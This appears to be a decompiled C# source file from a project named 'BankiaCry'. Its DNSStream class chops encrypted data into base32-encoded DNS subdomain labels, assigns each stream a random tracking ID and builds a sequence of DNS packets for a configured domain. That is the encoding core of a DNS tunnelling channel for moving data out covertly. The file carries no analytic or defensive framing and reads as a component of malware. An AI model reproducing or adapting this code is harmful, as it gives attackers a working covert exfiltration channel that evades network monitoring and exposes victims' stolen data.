using System;
using System.Collections.Generic;
using System.Text;

namespace BankiaCry;

internal class DNSStream
{
	private int _completedPackets;

	public byte[] _trckID { get; set; }

	public byte[] _rawinfo { get; set; }

	public int _maxPacketSize { get; set; }

	public int _maxSubdDepth { get; set; }

	public string _domain { get; set; }

	public List<DNSPacket> PacketStream { get; set; }

	private byte[] _encryptedInfo { get; set; }

	public DNSInfo.PacketType _pcktType { get; set; }

	public DNSPacket this[int packetNumber] => PacketStream[packetNumber];

	public DNSStream(byte[] info, string domain, DNSInfo.PacketType pcktType, HashSet<byte[]> existingStreams)
	{
		_encryptedInfo = info;
		_domain = domain;
		_trckID = CreateTrackID(existingStreams);
		_maxPacketSize = 253 - domain.Length - _trckID.Length - 2;
		_maxSubdDepth = _maxPacketSize / 64;
		_pcktType = pcktType;
		PacketStream = BuildStream();
		_completedPackets = 0;
	}

	public List<DNSPacket> BuildStream()
	{
		List<DNSPacket> list = new List<DNSPacket>();
		int num = _trckID.Length + 9 + Config.GetDomain().Length;
		int num2 = 253 - num;
		double num3 = Math.Ceiling((double)(float)_encryptedInfo.Length * 1.6 / (double)num2);
		int num4 = 0;
		ushort num5 = 0;
		while ((double)(int)num5 < num3)
		{
			int num6 = num2;
			List<string> list2 = new List<string>();
			while (num6 > 1 && num4 < _encryptedInfo.Length)
			{
				byte[] array = _encryptedInfo.SubArray(num4, Math.Min(39, Math.Min((int)Math.Floor((double)num6 / 1.6) - 1, _encryptedInfo.Length - num4)));
				string text = array.ToBase32String(addPadding: false);
				list2.Add(text);
				num6 -= text.Length;
				num6--;
				num4 += array.Length;
			}
			list.Add(new DNSPacket(_trckID, list2, num5, _pcktType, _domain));
			num5 = (ushort)(num5 + 1);
		}
		return list;
	}

	public bool ImDone()
	{
		return _completedPackets == PacketStream.Count;
	}

	public void OneMoreCompleted()
	{
		_completedPackets++;
	}

	private byte[] CreateTrackID(HashSet<byte[]> existingStreams)
	{
		byte[] array = genRandomTrckID();
		while (existingStreams.Contains(array))
		{
			array = genRandomTrckID();
		}
		return array;
	}

	private byte[] genRandomTrckID()
	{
		string text = "abcdefghijklmnopqrstuvwxyz0123456789";
		Random random = new Random();
		return Encoding.UTF8.GetBytes(new char[4]
		{
			text[random.Next(text.Length)],
			text[random.Next(text.Length)],
			text[random.Next(text.Length)],
			text[random.Next(text.Length)]
		});
	}
}
